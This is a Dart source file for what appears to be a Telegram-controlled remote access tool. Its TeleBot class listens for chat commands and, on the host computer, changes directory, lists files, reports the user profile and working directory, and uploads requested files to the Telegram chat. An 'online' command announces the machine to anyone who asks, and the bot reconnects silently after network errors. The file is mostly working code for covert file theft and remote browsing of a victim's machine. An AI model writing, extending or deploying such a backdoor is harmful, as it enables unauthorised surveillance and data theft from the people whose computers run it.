import 'dart:io';

import 'package:teledart/teledart.dart';
import 'package:teledart/telegram.dart';

import 'const.dart';
import 'download_upload.dart';
import 'id_store.dart';
import 'traversal.dart';

class TeleBot extends Traverslar {
  var user = Downloader().userProfile;
  String my_id;
  String myUser;
  var teledart = TeleDart(Telegram(Settings.telegramApi), Event());

  void initter() async {
    try {
      my_id = await User_DB().checkAndGet();
      await teledart.start().then((me) => myUser = me.username);
      await teledart
          .onCommand(RegExp('cd', caseSensitive: false))
          .listen((message) async {
        List parm = message.text.split(' ');
        print(parm);
        if (parm.last.toString() == my_id) {
          var newPath = changeDir(path: parm[1].toString());
          print(newPath);
          print(parm);
          await teledart.telegram
              .sendMessage(message.chat.id, newPath.toString());
        }
      });
      await teledart
          .onCommand(RegExp('getPcUser', caseSensitive: false))
          .listen((message) async {
        List parm = message.text.split(' ');
        if (parm.last.toString() == my_id) {
          await teledart.telegram.sendMessage(message.chat.id, user);
        }
      });
      await teledart
          .onCommand(RegExp('getFile', caseSensitive: false))
          .listen((message) async {
        List parm = message.text.split(' ');
        if (parm.last.toString() == my_id && parm.length == 3) {
          await teledart.telegram
              .sendDocument(message.chat.id, getFile(parm[1]));
        }
      });
      await teledart
          .onCommand(RegExp('getcwd', caseSensitive: false))
          .listen((message) async {
        List parm = message.text.split(' ');
        if (parm.last.toString() == my_id) {
          await teledart.telegram
              .sendMessage(message.chat.id, getCurrentDir().toString());
        }
      });
      await teledart
          .onCommand(RegExp('online', caseSensitive: false))
          .listen((message) async {
        await teledart.telegram
            .sendMessage(message.chat.id, user + '   ' + my_id.toString());
      });
      await teledart
          .onCommand(RegExp('getDir', caseSensitive: false))
          .listen((message) async {
        List parm = message.text.split(' ');
        if (parm.last.toString() == my_id && message.text.isNotEmpty) {
          await teledart.telegram.sendMessage(message.chat.id, getListFiles());
        }
      });
    } on SocketException catch (er) {
      sleep(Duration(seconds: 1));
      // recursive
      await initter();
    } catch (e) {
      print('error' + e.toString());
    }
  }

  @override
  bool operator ==(Object o) {
    if (identical(this, o)) return true;

    return o is TeleBot &&
        o.user == user &&
        o.my_id == my_id &&
        o.myUser == myUser;
  }

  @override
  int get hashCode => user.hashCode ^ my_id.hashCode ^ myUser.hashCode;
}
